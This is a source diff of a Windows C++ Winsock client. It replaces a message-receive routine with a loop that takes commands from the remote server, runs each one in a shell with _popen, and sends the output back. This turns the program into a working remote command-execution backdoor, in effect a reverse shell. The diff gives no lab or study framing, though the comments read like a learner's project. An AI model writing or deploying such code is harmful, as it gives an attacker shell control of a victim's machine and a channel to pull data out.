@@ -1,6 +1,7 @@
 #include <iostream> 
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <array>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -52,21 +53,68 @@ SOCKET createClientSocket() {
     return clientSocket;
 }
 
-void receiveMessage(SOCKET clientSocket) {
-    //creating a buffer for temp storage
-    char buffer[512]; // can hold 512 bytes of data from server side code
-    int iResult = recv(clientSocket, buffer, sizeof(buffer), 0);
+// void receiveMessage(SOCKET clientSocket) {
+//     //creating a buffer for temp storage
+//     char buffer[512]; // can hold 512 bytes of data from server side code
+//     int iResult = recv(clientSocket, buffer, sizeof(buffer), 0);
 
-    if(iResult > 0) {
-        buffer[iResult] = '\0'; // terminates string when reaching end, add 0 because we are working with c style string
-        cout << "Server message: " << buffer << endl;
-    }else if (iResult == 0) {
-        cout << "Connection Closed" << endl;
-    }
-    else {
-        cerr << "Recv failed." << endl;
+//     if(iResult > 0) {
+//         buffer[iResult] = '\0'; // terminates string when reaching end, add 0 because we are working with c style string
+//         cout << "Server message: " << buffer << endl;
+//     }else if (iResult == 0) {
+//         cout << "Connection Closed" << endl;
+//     }
+//     else {
+//         cerr << "Recv failed." << endl;
+//     }
+
+// }
+
+// execute shell command and capture output
+string executeCommand(const string &command) {
+    // buffer with 128 bytes of size which holds the output from command
+    array <char, 128> buffer;
+    string result;
+
+    // opens a pipe to execute a shell command, and returns the command in c string format, and reads the output
+    FILE *pipe = _popen(command.c_str(), "r");
+    if(!pipe) {
+        return "Command execution failed.";
     }
 
+    // fgets help us read a line from the pipe stream and saves it into buffer data. Buffer size shows how much we can store. Pipe is the string in which output written
+    while(fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
+        result += buffer.data(); // appends output of buffer into result
+    }
+    _pclose(pipe);
+    return result;
+}
+
+// continuously receive commands
+void handleServerCommand(SOCKET clientSocket) {
+    while(true) {
+        char buffer[1024];
+        int iResult = recv(clientSocket, buffer, sizeof(buffer) -1, 0);
+        
+        // indicates if we are receiving results, and then terminates once the end of command is reached
+        if(iResult > 0) {
+            buffer[iResult] = '\0';
+        
+            string command(buffer);
+
+            if(command == "exit") break;
+            
+            // executes command and sends the result to server side 
+            string result = executeCommand(command);
+            send(clientSocket, result.c_str(), result.length(), 0);
+        }else if(iResult == 0) {
+            cout << "Connection closed." << endl;
+            break;
+        }else {
+            cerr << "Recv failed." << endl;
+            break;
+        }
+    }
 }
 
 int main() {
@@ -74,8 +122,10 @@ int main() {
     iniWinSocket();
     SOCKET clientSocket = createClientSocket();
     cout << "Connected to the server" << endl;
+
+    handleServerCommand(clientSocket);
     
-    receiveMessage(clientSocket);
+    // receiveMessage(clientSocket);
    
   
 
